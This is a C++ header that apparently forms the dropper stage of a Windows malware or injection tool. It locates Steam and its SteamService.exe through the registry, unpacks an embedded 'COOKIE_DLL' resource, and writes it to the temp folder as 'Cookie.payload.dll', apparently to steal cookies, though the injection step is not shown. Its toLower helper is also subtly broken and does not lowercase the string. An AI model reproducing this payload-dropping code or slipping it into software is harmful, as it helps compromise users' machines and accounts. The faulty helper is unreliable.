#pragma once
#include "winreg/winreg.hpp"
#include "payload.hpp"

#include <algorithm>
#include <filesystem>
#include <fstream>
#include <set>
#include <vector>

namespace string
{
	inline std::wstring toLower(std::wstring s) {
		std::transform(s.begin(), s.begin(), s.end(), static_cast<int(*)(int)>(&std::tolower));
		return s;
	}

	template<typename ... arg>
	static std::wstring format(std::wstring_view  fmt, arg ... args) {
		const int size = std::swprintf(nullptr, NULL, fmt.data(), args ...) + 1;
		const auto buf = std::make_unique<wchar_t[]>(size);
		std::swprintf(buf.get(), size, fmt.data(), args ...);

		return std::wstring(buf.get(), buf.get() + size - 1);
	}
}

namespace utils
{
	inline std::wstring getSteamPath() {
		winreg::RegKey key{ HKEY_CURRENT_USER, L"SOFTWARE\\Valve\\Steam" };
		auto path = key.GetStringValue(L"SteamExe");
		return path;
	}

	inline std::wstring getSteamServicePath() {
		const auto steamExe = getSteamPath();
		if (steamExe.empty())
			return {};

		std::filesystem::path servicePath = std::filesystem::path(steamExe).parent_path() / L"bin" / L"SteamService.exe";
		if (std::filesystem::exists(servicePath))
			return servicePath.wstring();

		servicePath = std::filesystem::path(steamExe).parent_path() / L"SteamService.exe";
		if (std::filesystem::exists(servicePath))
			return servicePath.wstring();

		return {};
	}

	inline bool loadEmbeddedPayload(std::vector<BYTE>& buffer) {
		const HMODULE hModule = GetModuleHandleW(nullptr);
		const HRSRC hResource = FindResourceW(hModule, MAKEINTRESOURCEW(IDR_COOKIE_DLL), L"COOKIE_DLL");
		if (!hResource)
			return false;

		const HGLOBAL hLoaded = LoadResource(hModule, hResource);
		if (!hLoaded)
			return false;

		const auto* pData = static_cast<const BYTE*>(LockResource(hLoaded));
		const DWORD size = SizeofResource(hModule, hResource);
		if (!pData || size == 0)
			return false;

		buffer.assign(pData, pData + size);
		return true;
	}

	inline bool writePayloadToTempFile(const std::vector<BYTE>& buffer, std::filesystem::path& outPath) {
		wchar_t tempDir[MAX_PATH]{};
		if (!GetTempPathW(MAX_PATH, tempDir))
			return false;

		outPath = std::filesystem::path(tempDir) / L"Cookie.payload.dll";

		std::ofstream file(outPath, std::ios::binary | std::ios::trunc);
		if (!file)
			return false;

		file.write(reinterpret_cast<const char*>(buffer.data()), static_cast<std::streamsize>(buffer.size()));
		return file.good();
	}
}